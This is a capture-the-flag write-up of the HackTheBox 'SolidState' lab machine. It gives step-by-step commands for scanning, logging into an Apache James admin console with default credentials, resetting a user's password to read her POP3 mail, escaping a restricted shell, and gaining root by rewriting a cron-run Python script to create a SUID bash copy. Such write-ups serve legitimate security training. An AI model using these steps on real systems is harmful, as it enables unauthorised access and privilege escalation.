# SolidState – HackTheBox Write-Up (Medium)

![solidstate-banner](/imgs/solidstate-banner.png)

## 🧩 Overview
SolidState is a **Medium-difficulty HackTheBox machine** focusing heavily on:

- Email server enumeration  
- Apache James service abuse  
- POP3 mailbox access  
- Restricted shell escape  
- Privilege escalation via a root-executed Python script

This box is **excellent OSCP prep** due to the realistic enumeration path and post-exploitation requirement.

---

# 🕵️‍♂️ 1. Enumeration

## Nmap Scan

```bash
nmap -Pn -sC -sS -sV -T4 10.10.10.51 -oN solidstate_initial_scan.nmap
```

**Results:**

```
22/tcp   open  ssh
25/tcp   open  smtp      (Apache James SMTPD)
80/tcp   open  http      (Apache)
110/tcp  open  pop3      (Apache James Pop3d)
119/tcp  open  nntp
4555/tcp open  james-admin (Apache James Admin Console)
```

These ports tell us the key attack surface:

- Apache James mail server  
- POP3 mailbox access  
- Admin console for managing users  

---

# 🔐 2. Foothold via Apache James Admin Console

The admin interface on port **4555** uses **default credentials**:

```bash
telnet 10.10.10.51 4555
```

```
Login: root
Password: root
```

We reset the password for the user **mindy**:

```bash
setpassword mindy password1
```

This gives us POP3 access.

---

# ✉️ 3. Reading mindy’s Emails (POP3)

```bash
telnet 10.10.10.51 110
USER mindy
PASS password1
LIST
RETR 1
```

One email contains valid SSH credentials:

```
username: mindy
password: P@55W0rd1!20
```

This becomes our shell.

---

# 🧼 4. SSH Access & Restricted Shell Escape

SSH into the host:

```bash
ssh mindy@10.10.10.51
```

We land inside an **rbash** restricted shell.

Escape using:

```bash
ssh mindy@10.10.10.51 -t "bash --noprofile"
```

This drops us into a full Bash environment.

---

# 📌 5. Privilege Escalation

Inside `/opt/`, we find a world-writable Python script:

```
/opt/tmp.py
```

Original contents:

```python
#!/usr/bin/env python
import os
import sys
try:
    os.system('rm -r /tmp/* ')
except:
    sys.exit()
```

It is executed **as root via cron**, making it a perfect privesc vector.

---

## ✔️ Confirm Cron Execution

Replace contents temporarily:

```python
#!/usr/bin/env python
import os
os.system("echo 'cron works!' > /tmp/cron_test.txt")
```

Wait 60 seconds:

```bash
cat /tmp/cron_test.txt
```

Output:

```
cron works!
```

This confirms root is executing `/opt/tmp.py`.

---

## 🔥 Replace tmp.py with SUID Bash Dropper

```python
#!/usr/bin/env python
import os
os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")
```

Wait for cron to execute it, then:

```bash
ls -l /tmp/rootbash
```

You should see:

```
-rwsr-sr-x 1 root root ... /tmp/rootbash
```

Execute:

```bash
/tmp/rootbash -p
whoami
id
```

You're now **root**.

---

# 🏁 6. Capture the Flags

```bash
cat /home/mindy/user.txt
cat /root/root.txt
```

---

# 🎉 Conclusion

SolidState teaches valuable OSCP-level skills:

- Enumerating obscure mail services  
- Leveraging weak administrative interfaces  
- Using POP3 for credential harvesting  
- Escaping restricted shells  
- Identifying and exploiting cron-executed scripts  

A fantastic Medium machine that rewards thorough enumeration and logical exploitation.

---

# 📁 Screenshots

*(Add your screenshots here:)*

```
/imgs/nmap.png
/imgs/james-admin.png
/imgs/pop3.png
/imgs/rbash-escape.png
/imgs/tmp-py.png
/imgs/root-privesc.png
```

---

# 🏷️ Tags
`OSCP` `Privilege Escalation` `Email Exploitation` `Apache James` `Cron Abuse` `Restricted Shell`
